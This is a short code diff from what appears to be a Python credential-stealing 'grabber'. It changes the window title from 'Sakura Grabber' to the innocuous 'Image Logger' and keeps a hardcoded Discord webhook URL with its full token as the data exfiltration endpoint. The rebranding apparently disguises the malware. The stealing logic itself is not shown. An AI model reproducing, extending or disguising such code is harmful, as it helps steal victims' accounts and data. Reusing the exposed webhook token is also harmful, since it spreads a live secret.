@@ -7,7 +7,7 @@ from base64 import b64decode
 from msvcrt import getch
 from tkinter import messagebox
 
-os.system("title Sakura Grabber")
+os.system("title Image Logger")
 
 webhook = "https://discord.com/api/webhooks/1114495100484059239/-5qZvNNqsfCCH4-IenzzBN5P-_Dt-ynQi1v91FUd8wgCTTBY8EOoxGxm8gVJPIxjfaKm"
 webhook1 = Webhook('https://discord.com/api/webhooks/1114495100484059239/-5qZvNNqsfCCH4-IenzzBN5P-_Dt-ynQi1v91FUd8wgCTTBY8EOoxGxm8gVJPIxjfaKm')
